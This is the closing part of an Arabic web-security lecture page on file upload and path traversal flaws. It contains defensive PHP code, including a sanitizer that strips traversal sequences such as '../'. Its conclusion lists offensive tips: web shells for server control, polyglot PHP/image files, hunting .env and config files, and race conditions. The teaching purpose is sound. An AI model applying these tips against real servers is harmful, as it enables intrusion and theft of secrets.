                <h4><i class="fas fa-check-circle"></i> 3. إعادة تسمية الملفات وتأمين المسار</h4>
                <div class="code-example secure-code">
                    <pre><code class="language-php">// إعادة تسمية آمنة
$safe_filename = bin2hex(random_bytes(16)) . '.' . $file_extension;
$upload_dir = '/var/www/uploads/';

// منع Path Traversal
$safe_path = realpath($upload_dir . $safe_filename);
if (!$safe_path || !str_starts_with($safe_path, realpath($upload_dir))) {
    die('مسار غير آمن');
}

// نقل الملف
move_uploaded_file($_FILES['upload']['tmp_name'], $safe_path);

// إعداد .htaccess لمنع التنفيذ
file_put_contents($upload_dir . '.htaccess', 
    "Options -ExecCGI\n" .
    "AddHandler cgi-script .php .pl .py .jsp .asp .sh .cgi\n" .
    "Options -Indexes"
);</code></pre>
                </div>
            </div>

            <h3 class="subsection-title"><i class="fas fa-folder-open"></i> حماية Path Traversal</h3>
            
            <div class="highlight-box">
                <h4><i class="fas fa-check-circle"></i> 1. تنظيف المدخلات</h4>
                <div class="code-example secure-code">
                    <pre><code class="language-php">function sanitizePath($user_input) {
    // إزالة null bytes
    $clean = str_replace("\0", '', $user_input);
    
    // إزالة traversal sequences
    $clean = str_replace(['../', '..\\', '..', './'], '', $clean);
    
    // إزالة المسارات المطلقة
    $clean = ltrim($clean, '/\\');
    
    // فحص الأحرف المسموحة فقط
    if (!preg_match('/^[a-zA-Z0-9._-]+$/', $clean)) {
        throw new Exception('أحرف غير مسموحة في اسم الملف');
    }
    
    return $clean;
}</code></pre>
                </div>
            </div>

            <div class="highlight-box">
                <h4><i class="fas fa-check-circle"></i> 2. استخدام Whitelist للملفات المسموحة</h4>
                <div class="code-example secure-code">
                    <pre><code class="language-php">// قائمة بيضاء بالملفات المسموحة
$allowed_files = [
    'product1.jpg',
    'product2.jpg',
    'banner.png',
    'logo.gif'
];

$requested_file = $_GET['file'];

if (!in_array($requested_file, $allowed_files)) {
    http_response_code(404);
    die('الملف غير موجود');
}

$safe_path = '/var/www/images/' . $requested_file;
readfile($safe_path);</code></pre>
                </div>
            </div>

            <div class="highlight-box">
                <h4><i class="fas fa-check-circle"></i> 3. استخدام realpath() للتحقق من المسار</h4>
                <div class="code-example secure-code">
                    <pre><code class="language-php">$base_dir = '/var/www/uploads/';
$user_file = sanitizePath($_GET['file']);
$full_path = $base_dir . $user_file;

// الحصول على المسار الحقيقي
$real_path = realpath($full_path);

// التحقق من أن الملف داخل الدليل المسموح
if (!$real_path || !str_starts_with($real_path, realpath($base_dir))) {
    http_response_code(403);
    die('الوصول مرفوض');
}

// التحقق من وجود الملف
if (!file_exists($real_path)) {
    http_response_code(404);
    die('الملف غير موجود');
}

readfile($real_path);</code></pre>
                </div>
            </div>

            <div class="warning-box">
                <h4><i class="fas fa-exclamation-triangle"></i> تحذيرات مهمة</h4>
                <ul>
                    <li>لا تعتمد على فحص امتداد الملف فقط</li>
                    <li>احذر من Double URL Encoding</li>
                    <li>استخدم صلاحيات ملفات محدودة</li>
                    <li>فعل Web Application Firewall (WAF)</li>
                    <li>راقب ملفات الـ logs للأنشطة المشبوهة</li>
                </ul>
            </div>
        </div>

        <!-- الخلاصة -->
        <div id="conclusion" class="conclusion">
            <h2><i class="fas fa-trophy"></i> خلاصة المحاضرة</h2>
            
            <div class="highlight-box">
                <h4><i class="fas fa-check-circle"></i> النقاط الرئيسية المكتسبة</h4>
                <ul>
                    <li><strong>7 أنواع</strong> من ثغرات File Upload وطرق استغلالها</li>
                    <li><strong>6 تقنيات</strong> Path Traversal لتجاوز الحماية</li>
                    <li><strong>13 مختبر عملي</strong> من PortSwigger لإتقان التقنيات</li>
                    <li><strong>Web Shell Development</strong> للسيطرة على الخوادم</li>
                    <li><strong>طرق الحماية الشاملة</strong> لتأمين التطبيقات</li>
                </ul>
            </div>

            <div class="tips-box">
                <h4><i class="fas fa-lightbulb"></i> نصائح متقدمة للممارسين</h4>
                <ul>
                    <li>اجمع بين File Upload وPath Traversal للحصول على تأثير أقوى</li>
                    <li>استخدم Polyglot Files (PHP/Image) لتجاوز عدة فحوصات</li>
                    <li>اختبر جميع نقاط رفع الملفات في التطبيق</li>
                    <li>ابحث عن ملفات الإعداد الحساسة (.env, config.php)</li>
                    <li>استغل Race Conditions في معالجة الملفات</li>
                </ul>
            </div>

            <p>🔥 <strong>تذكر:</strong> ثغرات File Upload وPath Traversal من أخطر الثغرات لأنها تتيح الوصول المباشر للخادم والملفات الحساسة. الممارسة المستمرة على المختبرات ستجعلك خبيراً في اكتشاف واستغلال هذه الثغرات!</p>

            <a href="../index.html" class="back-home">
                <i class="fas fa-home"></i> العودة للصفحة الرئيسية
            </a>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-core.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/plugins/autoloader/prism-autoloader.min.js"></script>
</body>
</html> 